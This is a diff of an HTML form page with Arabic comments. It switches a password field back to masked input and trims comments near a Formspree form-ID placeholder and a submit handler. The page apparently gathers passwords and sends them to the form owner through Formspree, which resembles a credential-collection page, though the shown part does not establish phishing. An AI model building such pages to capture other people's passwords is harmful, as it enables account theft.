@@ -76,8 +76,8 @@
             
             <div class="form-group">
                 <label for="password">كلمة المرور:</label>
-                <!-- type="text" تخلي كلمة المرور تظهر واضحة بدون نجوم -->
-                <input type="text" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+                <!-- رجعنا type="password" باش الحروف تظهر في شكل نجوم -->
+                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
             </div>
 
             <button type="submit" id="submitBtn">إرسال</button>
@@ -90,12 +90,11 @@
         const btn = document.getElementById('submitBtn');
         const statusMsg = document.getElementById('status-message');
 
-        // حط الـ Form ID متاعك اللي تعطيهولك Formspree هنا بلاصة YOUR_FORM_ID_HERE
-        // مثال: const formID = "xqyvbzpd";
+        // حط الـ Form ID متاعك هنا (مثال: "xqyvbzpd")
         const formID = "YOUR_FORM_ID_HERE"; 
 
         form.addEventListener('submit', async function(event) {
-            event.preventDefault(); // يمنع فتح صفحات أخرى أو الانتقال للجيمايل
+            event.preventDefault(); // يمنع فتح صفحات أخرى
             
             btn.disabled = true;
             btn.textContent = 'جاري الإرسال...';
